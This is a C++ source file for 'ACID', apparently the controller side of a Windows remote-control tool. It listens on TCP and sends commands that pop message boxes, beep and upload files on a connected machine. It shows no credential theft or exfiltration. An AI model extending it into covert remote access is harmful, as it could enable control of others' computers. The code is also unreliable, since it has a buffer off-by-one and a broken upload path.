// server.cpp
#include "server.h"

#include "../UpDown.hpp"

TCP_Server::TCP_Server(int port) {
  WSADATA wsa_data;
  int result = WSAStartup(MAKEWORD(2,2), &wsa_data);
  if(result != 0) {
    std::cerr << "WSAStartup failed\n\t" << WSAGetLastError() << '\n';
    return;
  }

  sizeofaddr = sizeof(server_addr);
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(port);
  server_addr.sin_addr.s_addr = INADDR_ANY;

  server_socket = socket(AF_INET, SOCK_STREAM, NULL);
  if(server_socket == INVALID_SOCKET) {
    std::cerr << "Failed to create socket\n\t" << WSAGetLastError() << '\n';
    WSACleanup();
    return;
  }

  result = bind(server_socket, (SOCKADDR*)&server_addr, sizeof(server_addr));
  if(result == SOCKET_ERROR) {
    std::cerr << "Failed to bind server socket\n\t" << WSAGetLastError() << '\n';
    closesocket(server_socket);
    WSACleanup();
    return;
  }

  cmd_col::ColoredText(F_YELLOW);
  std::cout << "[ ACID ] Listening...\t\t" << "0.0.0.0" << '\t' << port << '\n';

  result = listen(server_socket, SOMAXCONN);
  if(result == SOCKET_ERROR) {
    std::cerr << "Failed to listen on connection\n\t" << WSAGetLastError() << '\n';
    closesocket(server_socket);
    WSACleanup();
    return;
  }
}

TCP_Server::~TCP_Server() {
  closesocket(server_socket);
  WSACleanup();
}

SOCKET TCP_Server::accept_client() {
  SOCKET client_socket;
  client_socket = accept(server_socket, (SOCKADDR*)&server_addr, &sizeofaddr);
  if(client_socket == INVALID_SOCKET) {
    std::cerr << "Failed to accept client socket\n\t" << WSAGetLastError() << '\n';
    closesocket(server_socket);
    WSACleanup();
    return INVALID_SOCKET;
  }
  return client_socket;
}

int TCP_Server::send_data(SOCKET s, const std::string& data) {
  int result = send(s, data.c_str(), data.size(), 0);
  if(result == SOCKET_ERROR) {
    std::cerr << "Failed to send data\n\t" << WSAGetLastError() << '\n';
    return 1;
  }
  cmd_col::ColoredText(F_CYAN);
  return 0;
}

std::string TCP_Server::receive_data(SOCKET s) {
  char buff[BUFF_SIZE];
  int result = recv(s, buff, sizeof(buff), 0);
  if(result == SOCKET_ERROR) {
    std::cerr << "Failed to receive data\n\t" << WSAGetLastError() << '\n';
    return "";
  }
  buff[result] = '\0';
  return std::string(buff);
}

void TCP_Server::process_command(SOCKET s, const std::string& command)
{
  /* On-side commands */
  if(command == "exit") 
  {
    this->send_data(s, command);
    std::cout << "[ ACID ] Goodbye!\n";
    exit(0);
  }
  // else if(command == "help")
  
  else if(command == "clear")
    system("cls");

  /* Both-side commands */
  else if(command == "msgbox") 
  {
    std::string caption;
    std::string text;

    cmd_col::ColoredText(F_LIGHTCYAN);
    std::cout << "[ MSGBOX ] Enter caption > ";
    std::getline(std::cin, caption);

    std::cout << "[ MSGBOX ] Enter text > ";
    std::getline(std::cin, text);

    this->send_data(s, command);
    this->send_data(s, caption);
    this->send_data(s, text);

    // todo: color
    std::cout << "[*] " << this->receive_data(s) << '\n';
  }

  else if(command == "msgbeep")
  {
    std::string duration;

    cmd_col::ColoredText(F_LIGHTCYAN);
    std::cout << "[ MSGBEEP ] Enter duration > ";
    std::getline(std::cin, duration);

    this->send_data(s, command);
    this->send_data(s, duration);

    std::cout << "[*]" << this->receive_data(s) << '\n';
    std::cout << "[*]" << this->receive_data(s) << '\n';
  }

  /* File transfering */
  else if(command == "upload")
  {
    std::string remote_path;
    std::string local_path;

    std::cout << "[ UPLOAD ] Enter local file path > ";
    std::getline(std::cin, local_path);

    std::cout << "[ UPLOAD ] Enter remote file path (OPTIONAL) > ";
    std::getline(std::cin, remote_path);

    this->send_data(s, local_path);
    if(remote_path == "")
      this->send_data(s, ".");

    UpDown::SendFile(s, local_path);
  }
}